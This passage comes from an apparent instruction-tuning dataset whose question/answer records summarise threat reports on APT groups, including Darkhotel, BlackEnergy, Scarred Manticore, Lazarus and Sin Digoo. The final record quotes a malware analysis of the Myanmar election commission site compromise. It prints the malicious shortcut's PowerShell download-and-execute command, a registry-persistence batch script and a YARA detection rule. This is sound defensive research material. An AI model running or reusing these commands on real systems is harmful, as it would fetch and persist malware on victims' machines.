    "output": "Brute force is a technique used by adversaries to gain access to accounts by systematically guessing passwords. In the case of the Darkhotel APT group, they utilize brute force to infect executable files on removable drives. Specifically, the virus component of the Darkhotel malware 'simply brute forces the list of mapped removable drives' starting from disk number 4 (D:) to disk number 20 (Z:). This allows the malware to spread and infect multiple systems. Furthermore, the fact that the Darkhotel crew is able to launch sophisticated attacks, including factoring 512-bit RSA keys, suggests that they may also employ brute force techniques in other aspects of their campaigns, such as password cracking. Overall, the use of brute force by Darkhotel highlights the importance of implementing robust password policies and account security measures to prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the BlackEnergy APT group leverage Office documents with macros to deliver their payloads, and what are the implications for cybersecurity professionals?",
    "output": "The BlackEnergy APT group uses Office documents with macros as a delivery mechanism for their Trojan. Specifically, they have transitioned from using Excel workbooks to Microsoft Word documents. These documents often contain lures related to current events or organizations, such as the 'Right Sector' party in Ukraine, to entice users to enable macros. Once enabled, the macros execute scripts that download and install the BlackEnergy Trojan. This method is effective because it relies on social engineering to bypass security measures implemented by Microsoft, which require users to explicitly enable macros. Cybersecurity professionals need to be aware that all types of Office documents, including Word and PowerPoint, can contain macros and pose a risk. This awareness is crucial for implementing robust security protocols and educating users about the dangers of enabling macros from untrusted sources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What types of tools did the CARBANAK attackers use in their toolset, and how did they manage to evade detection by antivirus vendors?",
    "output": "The CARBANAK attackers used a mix of custom tools, freely available code, and open source software utilities in their toolset. RSA IR researched all 32 of the malicious files in the CARBANAK toolset using various publicly available and open source resources. Six of these tools were found to have been uploaded to a publicly available antivirus aggregation site, with five of them having little to no detection or indication of malice from antivirus vendors. This lack of detection explains why the client's signature-based host protection mechanisms were unable to identify or prevent the use of these tools.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: LIONTAIL version using named pipes\nDuring our research, we also found loaders that have a similar internal structure to the LIONTAIL samples. Instead of listening on URL prefixes, this version gets its payloads from a named pipe and likely is designated to be installed on internal servers with no access to the public web. The configuration of the malware is a bit different:\nQWORD var_0\nQWORD var_8\nQWORD var_10\nDWORD var_18\nDWORD dwOpenMode\nDWORD dwPipeMode\nDWORD nMaxInstances\nDWORD nOutBufferSize\nDWORD nInBufferSize\nDWORD nDefaultTimeOut\nSTRING pipe_name\nThe main shellcode starts with (<https://learn.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora>)converting the string security descriptor \"D: (A;;FA;;;WD)\" into a valid, functional security descriptor. As the string starts with \"D\", it indicates a DACL (discretionary access control list) entry, which typically has the following format: entry_type:inheritance_flags(ACE_type; ACE_flags; rights; object_GUID; inherit_object_GUID; account_SID). In this case, the security descriptor allows (A) File All Access  (FA) to everyone (WD).\nThe security descriptor is then used to a named pipe based on the values provided in the configuration. In the samples we observed, the name of the pipe used is \\\\.\\pipe\\test-pipe.\nIt's noteworthy that, unlike the HTTP version, the malware doesn't employ any more advanced techniques for connecting to the named pipe, reading from it, and writing to it. Instead, it relies on standard kernel32.dll APIs such as CreateNamedPipe, and ReadFileWriteFile.\nThe communication of named pipes-based LIONTAIL is identical to the HTTP version, with the same encryption mechanism and the same structure of the payload which runs as a shellcode in memory.\nMedium Headline: Next stages\nTo make things more complicated, Scarred Manticore wraps the final payload in nested shellcodes. For example, one of the shellcodes received from the attackers runs another almost identical shellcode, which in turn runs a final shellcode responsible for machine fingerprinting.\nThe data gathered by this payload is collected by running specific Windows APIs or enumerating the registry keys, and includes these components:\nComputer Name (using GetComputerNameW API) and Domain Name (using GetEnvironmentVariableA API)\nFlag if the system is 64-bit (using GetNativeSystemInfo API, the check is done with wProcessorArchitecture == 9)\nNumber of processors (dwNumberOfProcessors using GetNativeSystemInfo API)\nPhysical RAM (GetPhysicallyInstalledSystemMemory)\nData from CurrentVersion registry key (Type, Name length, Name, Data length, Data)\nData fromSecureBoot\\State registry key (the same data)\nData from System\\Bios registry key (the same data)\nThe final structure, which contains all the gathered information, also has a place for error codes for the threat actor to use to figure out why some of the APIs they use don't work as expected:\nDWORD last_error (GetComputerNameW)\nDWORD last_error (GetPhysicallyInstalledSystemMemory)\nDWORD last_error (GetEnvironmentVariableA)\nDWORD last_error (NtOpenKey CurrentVersion)\nDWORD last_error (NtQueryKey CurrentVersion)\nDWORD num_of_values (CurrentVersion)\nDWORD last_error (NtOpenKey SecureBoot\\State)\nDWORD last_error (NtQueryKey SecureBoot\\State)\nDWORD num_of_values (SecureBoot\\State)\nDWORD last_error (NtOpenKey System\\Bios)\nDWORD last_error (NtQueryKey System\\Bios)\nDWORD num_of_values (System\\Bios)\nQWORD num_of_proccesors\nQWORD total_RAM\nQWORD tick_count\nQWORD is_64_bit\n_CHAR[0X10] computer_name\n_CHAR[0X10] domain_name\n_BYTE[] CurrentVersion_data\n_BYTE[] SecureBootState_data\n_BYTE[] SystemBios_data\nMedium Headline: LIONHEAD web forwarder\nOn some of the compromised exchange servers, the actors deployed LIONHEAD, a tiny web forwarder. LIONHEAD is also installed as a service using the same phantom DLL hijacking technique as LIONTAIL and utilizes similar mechanisms to forward the traffic directly to Exchange Web Services (EWS) endpoints.\nLIONHEAD's configuration is different from LIONTAIL:\nDWORD timeout 0x493E0\nDWORD forward_port 444\nSTRING end_string '<redacted>'\nSTRING forward_server 'localhost'\nSTRING forward_path '/ews/exchange.asmx'\nSTRING[] listen_urls 'https://+:443/<redacted>/'\nThe backdoor registers the listen_urls prefixes in the same way as LIONTAIL and listens for requests. For each request, the backdoor copies the content type, cookie, and body and forwards it to the <forward_server>/<forward_path>:<forward port> specified in the configuration. Next, the backdoor gets a response from forward_server and sends it back to the URL that received the original request.\nThis forwarder might be used to bypass the restrictions on external connections to EWS, hide the real consumer of EWS data being external, and consequently conceal data exfiltration.\nMedium Headline: Web shells\nScarred Manticore deploys multiple web shells, including those previously indirectly to OilRig. Some of these web shells stand out due to their obfuscations, naming conventions and artifacts. The web shells retain class and method obfuscation and a similar string encryption algorithm (XOR with one byte, the key is derived from the first byte or from the first 2 bytes) to many other web shells and .NET-based tools used by Scarred Manticore in their attacks over the past few years.\nOne of those shells is a heavily obfuscated and slightly modified version of an open-source XML/XSL transform web shell, . This web shell also contains two obfuscated functions that return the string \"~/1.aspx\". These functions are never called and likely are remnants from other versions, as we observed them in tools used previously by Scarred Manticore, such as FOXSHELL, which is discussed later:\nQuestion: How does the LIONHEAD web forwarder function and what purpose does it serve in Scarred Manticore's operations? What techniques does it use to achieve its goals?",
    "output": "Answer: The LIONHEAD web forwarder is a small component deployed on compromised exchange servers by Scarred Manticore. It is installed as a service using a phantom DLL hijacking technique and forwards traffic directly to Exchange Web Services (EWS) endpoints. Its configuration includes parameters like timeout, forward port, forward server, forward path, and listen URLs. LIONHEAD registers the listen URL prefixes and listens for requests, copying the content type, cookie, and body, and forwarding them to the specified forward server and path. It then receives a response from the forward server and sends it back to the original requester. The purpose of LIONHEAD is to bypass restrictions on external connections to EWS, hide the real consumer of EWS data, and conceal data exfiltration. This helps the threat actor maintain stealth and control over the compromised environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 5.3 Notification\nInvestigations of malware activity, such as that undertaken as part of the Shadow and GhostNet investigations, can yield information about the network infrastructure of the attackers, information about those who have been compromised, and confidential or private documents or other data that may have been exfiltrated without prior knowledge. Access to this information on all levels raises a number of practical, ethical and legal issues, many of which are unclear given the embryonic nature of the field of inquiry as a whole.\nThroughout this investigation, we have been conscious of these issues and have attempted to meet a professional standard in terms of planning and documenting our steps taken in the process of notification. This entailed research into existing practices and principles, and engagement with the law enforcement, intelligence and security communities in a number of countries. We were also conscious of the need to comply with the domestic laws in whose context this investigation was undertaken \u2014 namely those of India, the United States and Canada \u2014 as well as principles governing all academic research at the University of Toronto, where the Citizen Lab is located.\nNotification itself can be broken down into several categories, each of which entails complicating factors. First, there is notification that is required to takedown the command and control infrastructure, typically to the hosting and service provider companies through which the malware networks operate and on which they are hosted. Complicating matters, these services can be located in numerous national jurisdictions and subject to a variety of privacy laws and norms. Second, there are issues around notification of victims, such as governments, businesses, NGOs and individuals. This type of notification is perhaps the most challenging on ethical, practical and legal grounds. Notification of governments, for example, can be a very sensitive matter, especially if classified documents are involved or information is retrieved that is relevant to national security concerns. The same holds true of notification to individuals or businesses. At what point should a researcher notify a victim? Who within the organization, whether it is a government, a business or an NGO, is the appropriate point of contact for the notification? What if the notification jeopardizes a third party's security, or leads to some kind of retaliation or retribution? Should researchers notify law enforcement and intelligence agencies in their own countries before reaching out to foreign governments?\nExisting practices in this area are underdeveloped and largely informal. In part, this reflects the fact that global cyber security is still an embryonic field. But it also speaks to the very real problem of competitive power politics at the highest levels of national security, which tend to restrict information sharing in sensitive areas around cyber crime and espionage. Generally speaking, information sharing among law enforcement and intelligence agencies across borders is tentative at best, with the exception of that which occurs among close allies with deeply entrenched and long-standing links. Outside of those security communities, notification of services and governments tends to be restricted to specialist technical communities, telecommunications operators, and network administrators, if it occurs at all. Consequently, notification of the types referred to above can be ad hoc and inconsistent, largely contingent on the informal connections among professional communities.\nAll of these issues were grappled with in the aftermath of the Tracking GhostNet report, and throughout the course of the Shadow investigation. Our experiences in the aftermath of GhostNet, where notification was left incomplete, prompted a more deliberate and self-conscious approach with the Shadow investigation. We were also fortunate to have within our collaboration the experiences of the Shadowserver Foundation, whose counsel on notification helped in making decisions about timing and contacts.\nBy the end of November 2009, we were confident in our access to the basic command and control infrastructure and identification of some of the key documents at hand. Upon the realization that some information about individual Canadians was compromised, we notified Canadian authorities in December 2009 about the investigation, the compromise of Canadian-related information, and requested assistance on outreach with one of the victims, namely the Indian government. At the same time, we independently explored whom we might contact in the Indian government, including making inquiries with Canada's Department of Foreign Affairs. By February 2010, we were able to find on our own what we thought was an appropriate contact in the Indian government, and gave a detailed notification to the National Technology Research Organization. Our notification for takedown of the command and control infrastructure came later in the investigation, after we had collected and analyzed all of the information related to this report, but prior to its release.\nOur experiences illustrate the intricate, nuanced and often confusing landscape of global cyber security notification practices. The notification process will continue after the publication of this report.\nShadows in the Cloud points to a disturbing complex ecosystem of malware. Although malware networks, cyber crime and espionage have been around for years, the evidence presented here shows how these networks can be aggressively adaptive systems, multipying and regenerating across multiple vectors and platforms, and exploting the vulnerabilties within the latest Web 2.0 technologies to expand their reach and impact. Although there is rich detail to what is uncovered in the Shadow investigation, so much of the origins, architecture and aims of these networks ultimately remain a mystery and await further investigation and analysis. However, even with the partial insights and fleeting glimpses acquired here, we can draw some conclusions and implications for further research, policy and operations.\nFirst, the research here shows, as with Tracking GhostNet, how even a relatively small research sample \u2014 in this case Tibetan organizations \u2014 can expand, upon investigation and analysis, into an astonishingly large pool of victims. The connections drawn out here beg the question of what would emerge if the research began with a different group, from a different region of the world, with a different target set of compromised actors? Clearly, an area of methodological advantage for both the Tracking GhostNet and the Shadows in the Cloud investigations was to have access in the field to compromised computers and be able to work outwards in a structured and systematic fashion, using a combination of technical investigations and data analysis. An area of further research is to extend such efforts to other locations in other regions of the world. Such investigations may reveal other malware networks, or entirely new and unanticipated modes of crime and espionage.\nSecond, Shadows in the Cloud underscores the extent to which the global networked society into which we have evolved socially, politically, economically, and militarily carries with it an underground ecoystem that is equally networked, though far less visible to those whom it compromises. Governments, organizations and other actors around the world have been quick to adopt computerized public and administration systems, including state security actors. Their investments into these technologies have developed at a much faster rate than the appropriate security policies and practices (Deibert and Rohozinski 2010).\nAlthough the Government of India was the most victimized according to what we uncovered in Shadows in the Cloud \u2014 and that certainly should yield a major consideration of public policy and security for that country \u2014 observations about India in this respect need to be qualified in at least two ways. First, Shadows in the Cloud reports only on observations and existing evidence, which by definition remain partial. There could be other countries victimized, involving these very same malware networks attackers, but of which we are unaware because of our limited samples. Second, and most importantly, there are numerous other countries and international organizations that are targeted here, perhaps not to the same extent, but targeted and infiltrated nonetheless. We can only infer what type of data was exfiltrated from these other actors that is of strategic value. Overall, however, the key point to draw is that networked societies can be compromised through networks in which they are invariably linked and mutually dependent.\nThird, and related, Shadows in the Cloud demonstrates clearly the potential for collateral compromise, one of the key hypotheses informing our research framework. This investigation indicates that data leakage from malware networks can compromise unwitting third parties who are not initially targeted by the attackers. Data contained on compromised machines can also contain valuable information on third parties that while on its own may not be significant, but when pieced together with other information can provide actionable and operational intelligence. The policy and operational implications of collateral compromise are serious and wide-ranging, and reinforce that security is only as strong as the weakest link in a chain. In today's networked world, such chains are complex, overlapping and dispersed across numerous technological platforms crossing multiple\nnational jurisdictions. Paying attention to domestic cyber security is therefore only a partial solution to a much wider problem. Today, no country or organization is a secure island in the global sea of information.\n\nWhat challenges did the authors face when notifying governments, businesses, NGOs, and individuals about being compromised by the Shadow APT, and how did they address these challenges?",
    "output": "The authors faced challenges such as the sensitivity of notifying governments about classified documents or national security concerns, identifying the appropriate point of contact within organizations, and the potential for jeopardizing third-party security or causing retaliation. They addressed these challenges by conducting thorough research, seeking counsel from organizations like the Shadowserver Foundation, and making deliberate and self-conscious decisions about timing and contacts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The Blockbuster Sequel\nBy Anthony Kasza and Micah\nYates Unit 42 has identified malware with recent compilation and distribution timestamps that has code, infrastructure, and themes overlapping with threats described previously in the (<http://www.novetta.com/2016/02/operation-blockbuster-unraveling-the-long-thread-of-the-sony-attack/>)Operation Blockbuster report, written by researchers at Novetta. This report details the activities from a group they named Lazarus, their tools, and the techniques they use to infiltrate computer networks. The Lazarus group is tied to the 2014 attack on (<http://fortune.com/sony-hack-part-1/>)Sony Pictures Entertainment and the (<https://www.scmagazine.com/south-korean-corporations-hit-by-widespread-attack-that-wiped-data-and-shut-down-systems/article/543718/>)2013 DarkSeoul attacks.\n4/7/2017\nThis recently identified activity is targeting Korean speaking individuals, while the threat actors behind the attack likely speak both Korean and English. This blog will detail the recently discovered samples, their functionality, and their ties to the threat group behind Operation Blockbuster.\n\nHow does the Lazarus group, known for the 2014 Sony Pictures Entertainment attack and the 2013 DarkSeoul attacks, demonstrate its adaptability and sophistication in its recent activities, as described in the PaloAlto_The-Blockbuster-Sequel report?",
    "output": "A: The Lazarus group demonstrates its adaptability and sophistication through several key aspects in its recent activities. Firstly, the group has been identified using malware with recent compilation and distribution timestamps, indicating ongoing development and deployment. Secondly, this malware exhibits code, infrastructure, and thematic overlaps with previous threats detailed in the Operation Blockbuster report, showcasing the group's ability to reuse and refine existing tools. Additionally, the recent activity targets Korean-speaking individuals, while the threat actors themselves are likely bilingual in Korean and English. This linguistic capability highlights the group's strategic approach in selecting and engaging with specific targets, further emphasizing their advanced tactics and techniques.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: INSIGHTS\n\u0141 Attackers will conduct\t reconnaissance on their targets and\t consider all sorts of targeting options (both direct and\t indirect).\n\u0141 Attackers may\ttarget a company\t in order to use it as a 'launchpad' to\t gain access to\t other targets, as demonstrated\t by\tthe targeting of\t ESTsoft's ALZip\t update server.\n\u0141 Attackers can conduct\t selective targeting \u00adchoosing\t which\tcomputers download\t malicious content and\t which do\t not, as they appear to have done with\tthe ALZip\t update server.\n\u0141 Even though two computers may\tsubmit\t an identical request for a file (or webpage),\t they\t may\tnot get\t the same file (or webpage) back in response. This\tbehaviour reduces the likelihood\t of malware unintentionally\t going viral.\t Unfortunately\tit\t also\t hampers investigations by network defenders who may\tassess a file (or webpage) to be safe,\t when it is\t not\t safe to\t all users.\n\u0141 Attackers may\thack a computer for the sole purpose of\t using\t it as a 'waypoint' or as an intermediary\tlocation from\t where they can store and access their tools without suspicion from their targets.\t This \tappears to\t have been the case with\tthe use of the Cite Media Holding Group\t webserver and the Nonhyeong\t based waypoint, although it\t is possible they were initially\t hacked for another reason.\n\u0141 Attackers may\tuse the same registration information to\t register multiple domain names.\t Such\tappears to have been the case with the domains registered by 'Lee Cooper'.\n\u0141 Attackers may\t register domains containing words that\t are expected\t to\t make them\t appear less suspicious to\t targets.\t Such\tas with the use of\t 'nateon'and 'alyac' in the callback domains used\t by infected SK\t Communications computers.\n\u0141 Attackers may\tuse seemingly\tlegitimate registration information to\t register domain names.\t Such\tappears to have been the case with the registration of 'alyac.org' and 'trendmicros.net'.\n\u0141 Users should\t be wary\tof domains which\t appear to be legitimate but\t are not.\t Such\tas 'alyac.org' instead of\t 'alyac.com',\n'trendmicros.net' instead\t of\t 'trendmicro.com', 'nprotects.org' instead of\t 'nprotect.com' and 'bomuls.com' instead\t of 'bomul.com'.\n\u0141 Even though it is relatively\t easy\tto\t create new\t infrastructure,\t attackers sometimes reuse infrastructure.\t For example,\t the domains 'bbs.ezxsoft.com' and 'update.alyac.org' both previously\tpointed to\t IP address 202.30.244.240,\t and 'alyac.org',\t 'trendmicros.net', 'nprotect.org' and\t 'bomuls.com' all pointed to\t IP address 222.122.20.241.\n\u0141 The TTL of domains (in DNS records) controlled\t by attackers are often set\t to low values (such\tas 30 minutes) allowing\t the attackers to\t rapidly\tchange the command\t and\t control server pointed to\t by a callback domain. This\t facilitates relatively\t uninterrupted access to a target\t when command\t and\t control infrastructure becomes blocked or is\totherwise unavailable.\n\u0141 The use of\t legitimate domains for malicious purposes,\t familiar words\t in domain names and\t of non\u00admalicious IP\t addresses in DNS\t records \tfor malicious domains,\t can make detection of malicious activity\tmore difficult and\t cause network defenders to\t dismiss malicious activity\t(in network/system\t logs\t or Intrusion Detection System\t alerts, in particular) as legitimate.\n\u0141 Adding malicious IP\t addresses and domains to\t blacklists can help\t prevent\t malicious activity, \thowever, attackers can respond\t by\t merely\tusing\t alternate infrastructure and/or callback domains.\n\u0141 Domains and\t IP addresses may\thave legitimate purposes too\t and blacklisting\t them may\talso\t block legitimate business.\t Blacklists should\t be reviewed periodically\t to\t ensure they\t are not\t blocking\t legitimate business unnecessarily.\n\u0141 Whitelists are generally\tmuch\tmore effective than blacklists,\t however, even whitelists can allow malicious activity to occur to\t legitimate sites that have been compromised.\t For example, as a good\t security\t practice,\t most system\t administrators would\t have allowed\t access to\t the ALZip update server if they had\t ALZip\t software installed on their network.\t Similarly,\tif a whitelist were employed on the targeted network but users had a legitimate need to access the website of\t the Taiwanese publishing company,\tthe attacker would\t likely\tstill have been able to access their toolbox.\n\u0141 Users and\t network administrators need to continually\treassess who and\t what\t they trust\t on the Internet given that\t trust\t relationships can be,\t and increasingly\tare, exploited for malicious purposes.\n\nIn the SK Communications incident, how did the attackers leverage seemingly legitimate registration information and domain names to evade detection? What strategies can network defenders employ to counteract these tactics?",
    "output": "The attackers leveraged seemingly legitimate registration information and domain names to evade detection by registering domains that appeared less suspicious to targets. For example, they used domains like 'nateon' and 'alyac' in callback domains, and registered domains such as 'alyac.org' and 'trendmicros.net' with legitimate-sounding names. Additionally, they reused infrastructure and set low TTL values for DNS records to facilitate rapid changes in command and control servers. To counteract these tactics, network defenders should be wary of domains that appear legitimate but are not, such as slight variations of well-known domains. They should also review blacklists periodically to ensure they are not blocking legitimate business unnecessarily and consider using whitelists, while being aware that even whitelisted sites can be compromised. Continual reassessment of trust relationships on the internet is crucial, as these relationships can be exploited for malicious purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Espionage malware\nThere are two primary malware families involved with the Sin Digoo domains. One is known as \"Enfal\", which is short for \"EtenFalcon\", a string found inside early samples. The involvement of actors using this malware for espionage was first detailed in 2010 in a joint report by the (<http://www.nartv.org/mirror/shadows-in-the-cloud.pdf>)Information Warfare Monitor and the Shadowserver Foundation. The report, titled \"Shadows in the Cloud: Investigating Cyber Espionage 2.0,\" was a continuation of research from an earlier report titled \".\" A later report by antivirus firm Trend Micro titled \"(<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_dissecting-lurid-apt.pdf>)The LURID Downloader\" further details a campaign of espionage by this malware against targets worldwide.\nA second family of malware connecting to the \"Tawnya Grilth\" domains is less well-known, although a couple of antivirus companies have used the names \"RegSubsDat\", \"RegSubDat\" or \"Kirpich\" to refer to it. A recent variant was described by the information security firm CyberE-SI in a 2011 blog post titled \"India-United States Naval Cooperation.doc Analysis.\" Details regarding the earlier variant used in the Sin Digoo activity was first analyzed in a blog posting by Don C. Weber titled \"(<http://www.cutawaysecurity.com/blog/archives/593>)Malware Characteristics Report - Trojan.RegSubsDat.A\" on his Security Ripcord blog.\nAlthough windowsaupdate.com is not a \"Tawnya Grilth\" domain according to the WHOIS data, the name is almost certainly related to the domain windowsaupdate.net, especially given the same subdomain naming pattern (e.g., v4, v12, v14).\nMedium Headline: Victim discovery\nCTU analysts sinkholed a number of the \"Tawnya Grilth\" domains in 2011 and 2012. Traffic from infected victim computers is now sent to servers that log connections, gather statistics, and notify victims when possible. The initial findings from the sinkholing activity are:\n1. Between 100 and 200 computers located in Vietnam, Brunei, and Myanmar are infected by RegSubsDat. Analysis of the IP addresses connecting to the sinkhole show that many are government ministries. Additionally, more than one regional petroleum company and a newspaper has been infected.\n2. A handful of victim computers in Europe and the Middle East are infected by RegSubsDat, Enfal, and one other unknown trojan. These computers belong to government ministries in different countries, an embassy, a nuclear safety agency, and other business-related groups. Additionally, there is an embassy located inside mainland China that is infected.\nThe CTU researchers have notified many of the national computer security incident response teams (CSIRTs) in the countries where infections were detected and are continuing this notification process. The notifications include the necessary information to locate victims within the country, inform the victims, and mitigate the infections.\nMedium Headline: Link to RSA breach\nIn addition to the GhostNet link, connections can also be drawn between the malware used in the Sin Digoo activity and the (<http://www.rsa.com/node.aspx?id=3872>)RSA breach revealed in early 2011. According to the (<http://www.occ.treas.gov/news-issuances/alerts/2011/alert-2011-4.html>)US-CERT EWIN-11-077 bulletin, a number of command-and-control (C2) hostnames used by RegSubs-Dat shared three different IP addresses at different points in time, with one of the hostnames known to be part of the RSA breach. This C2 hostname was used in a piece of malware known as \"Murcy\", which was detailed in \"(<http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf>)Command and Control in the Fifth Domain,\" a 2012 report by Command Five Pty Ltd.\nAll three IP addresses belong to the China Beijing Province Network (AS4808). Although the RegSubsDat and Murcy C2s shared these IPs a few months apart, the fact that three IP different addresses at the same ISP overlapped in a short time frame seems to indicate shared infrastructure used by both the RSA breach actors and other actors using the RegSubsDat malware. AS4808 is known for many other connections to malware and is considered by some to be a hotbed of espionage C2s, especially the 123.120.96.0/19, 114.248.80.0/20 and 114.248.96.0/20 subnets. These subnets have been seen in DNS records for hundreds of C2 hostnames for dozens of custom malware families, either known for or\nsuspected in espionage activity.\nQuestion: What were the primary findings from the sinkholing activity conducted by CTU analysts on the 'Tawnya Grilth' domains, and how did these findings highlight the scope and targets of the Sin Digoo espionage campaign?",
    "output": "Answer: The primary findings from the sinkholing activity conducted by CTU analysts on the 'Tawnya Grilth' domains revealed that between 100 and 200 computers in Vietnam, Brunei, and Myanmar were infected by the RegSubsDat malware. These infections included government ministries, regional petroleum companies, and a newspaper. Additionally, a smaller number of victim computers in Europe and the Middle East were infected by RegSubsDat, Enfal, and another unknown trojan. These victims included government ministries, an embassy, a nuclear safety agency, and various business-related groups, including an embassy inside mainland China. These findings underscore the broad geographical reach and strategic targeting of the Sin Digoo espionage campaign, which aimed at high-value targets across multiple sectors and regions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Union Election\t Commission Website Malware: August-October, 2015\nSeveral additional malware files were discovered on the Myanmar Union\t Election Commission (UEC) website since the prior report that\t was initially published on August\t 17, 2015 [4].\nThe presence of new malware after the initial notification process from Arbor indicates an ongoing compromise of the site and possibly related sites and suggests that\t a\t more diligent\t Incident\t Response process was required to discover all of the compromised infrastructure and victims of the malware activity.\nThese newer files and related content\t shall be analyzed herein.\nSmall Headline: Malware #1-6: Six RAR Files Containing PlugX, EvilGrab, an unknown malware, and the Trochilus RAT\nAs documented in the \"Defending the White Elephant\" paper, several RAR\t files containing malware were discovered on the UEC website in the past.\tAs of October 20, 2015 a\t new file was discovered at\t http://www.uecmyanmar[.]org/dmdocuments/UEC-Invitation.rar and was present\t as of November 2015. Following the trail left\t by this malware has helped ASERT uncover other related threat\t activity to include a\t cluster of six malware packages stored in RAR\t file format\t on a\t staging/distribution server.\nSmall Headline: Malware #7: 3102 Variant of the 9002 RAT in Firefox Plugin\nAn additional malware file was stored at\t http://www.uecmyanmar[.]org/plugins/system/jatabs/jatabs/FlashVideoPlayer.php and was submitted to VirusTotal on August\t 21, 2015 from Japan and later on October 13 from Singapore.\t FlashVideoPlayer.php contained a\t ZIP file that\t stored a\t Firefox plugin, which was used to launch the 3102 variant\t of the 9002 RAT. Another instance of this RAT was also mentioned by Citizen Lab in their report, \"Targeted Malware Attacks against\t NGO Linked to Attacks on Burmese Government\t Websites\". The presence of the exact\t same RAT family inside the fake Firefox Plugin on the UEC website creates a\t link between this artifact\t and attacks on the unnamed NGO that\t were discussed inside the Citizen Lab report.\nSmall Headline: Malware set #1: Six RAR files (two PlugX, one EvilGrab, one unknown, two Trochilus RAT)\nFigure 1: Screenshot of website containing additional malware (UEC-Invitiation.rar) as of October 20, 2015\nThe newly observed file, stored in a\t RAR, is a\t storage tactic that\t has been\tpreviously \tobserved\t on the same site. Two prior filenames (discussed in the White Elephant\t report) were invitations.rar and PlanProposal.rar.\nInside the UEC-Invitation.rar file there is a\t folder called UEC Invitation that\t contains another folder called Invitation. Inside this folder is a\t shortcut\t file, Invitation.LNK with a\t timestamp of August\t 24, 2015. Analysis of the .LNK file turns up some interesting elements, such as the use of PowerShell inside the Target\t field, \twhich\t performs a\t download and execute of additional malware.\nFigure 2: Analysis of the .LNK file reveals malicious Powershell\nAnalysis of the LNK file metadata\t property store reveals some interesting aspects of the malware.\nFigure 3: In-depth analysis of .LNK metadatda\nOf interest\t is the System.ItemTypeText\t value (a\t so-called \"friendly name\" of a\t Windows element that\t is displayed during the use of an application) of UNDP, which may stand for the United Nations Development\t Program, the UN's global development\t network. The Myanmar-focused page for the UNDP [www.mm.undp.org] describes their mission as follows: \"In Myanmar, UNDP provides support\t to the national political and socio-economic reforms that\t underpin the country's transition\". Therefore, the UNDP, or those that\t work with the UNDP may have been targeted and may still be a target.\nThe System.DateCreated and System.DateModified values show September 15, 2014, which could indicate that\t campaign activity has been underway for over a\t year. It\t is also possible that\t this date could be modified.\nThe next\t two fields of interest\t relate to the local filepath on the system that\t was used to create the LNK shortcut\t file.\nSystem.ItemFolderPathDisplayNarrow and System.ParsingPath both reveal the presence of a\t Dropbox folder, and an Admin subfolder that\t contains another folder named UNDP. Using cloud storage facilities appears to be a\t known tactic of this group of actors, as they were observed utilizing Google Drive as described in \"Targeted Attacks on an Environmental NGO\" by CitizenLab. To our\nknowledge, these are the first\t signs that\t Dropbox may also have been used.\nThe powershell is as follows (brackets added to any malicious contents to prevent\t accidental clicks):\n%windir%\\System32\\cmd.exe /c mode con cols=15 lines=1 & powershell (new-object System.Net.WebClient).DownloadFile('http://www.oma.org[.]tw/setup/note.exe','%TEMP%\\note.exe'); Start-Process '%TEMP%\\note.exe'\nThe shortcut\t uses\t a\t command prompt to run PowerShell to invoke a\t System.Net.WebClient\t class to use the DownloadFile method to get\t note.exe from target\t site, store it\t in\t%TEMP% then run the file.\t This\tpowershell\t basically performs a\t typical \"download and execute\" function of the file located at http://www.oma.org[.]tw/setup/note.exe.\nThe www.oma.org[.]tw site is the \"Occupational Medicine Association in R.O.C.\". This site is or was insecure, as it\t had been compromised and defaced several times by apparently unrelated actors. The malware mentioned herein has since been removed.\nFigure 5: Setup directory containing two malware\nThe payload of the first\t downloader, Note.exe also uses PowerShell to download and execute http://down.360safe.com/inst.exe, which is the 360Total Security (Qihoo 360) anti-malware app.\tPowerShell also downloads and executes the file Setup.exe from the same staging directory on www.oma.org[.]tw/setup/.\nNote.exe creates a\t persistence mechanism by creating a\t file called StartON.bat which is then added to the Windows registry.\tThe relevant\t code is as follows:\nstart /min powershell (new-object System.Net.WebClient).DownloadFile('http://down.360safe[.]com/inst.exe', 'C:\\\\ProgramData\\\\ChromeDel.exe'); Start-Process -Wait -FilePath C:\\\\ProgramData\\\\ChromeDel.exe\necho start /min powershell (new-object\nSystem.Net.WebClient).DownloadFile('http://www.oma.org[.]tw/setup/Setup.exe', 'C:\\\\ProgramData\\\\ChromeDel.exe'); Start-Process 'C:\\\\ProgramData\\\\ChromeDel.exe'>C:\\\\ProgramData\\\\StartON.bat\nreg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v StartON /t reg_sz /d C:\\\\ProgramData\\\\StartON.bat /f\nSetup.exe executes and drops two files: 'data.dat' and 'shell.dll' into the WEventsCache folder. Data.dat\t appears to be encrypted, and shell.dll attempts to pose as a\t binary associated with the UltraEdit\t application. Shell.dll appears to be a\t helper application known to its developers as Servant\t Shell. Based on review of the\ncode of the Trochilus RAT discovered by ASERT, shell.dll is a\t file \tgenerated when the RAT is compiled.\nA YARA rule for discovering additional samples of ServantShell was created.\n// servantshell.yara 10/26/15\n// Arbor Networks ASERT Nov 2015\nrule servantshell {\nstrings:\n$string1 = \"SelfDestruction.cpp\"\n$string2 = \"SvtShell.cpp\"\n$string3 = \"InitServant\"\n$string4 = \"DeinitServant\"\n$string5 = \"CheckDT\"\ncondition: all of them\n}\nA relatively new feature of VirusTotal called RetroHunt\t was used with this YARA rule to discover other samples of this malware. The malware appears to be rare - out\t of 80 terabytes of malware stored inside VirusTotal at\t the time of search, only eight\t additional samples were discovered. One sample clearly revealed information about\t where the malware had been found in the wild. The 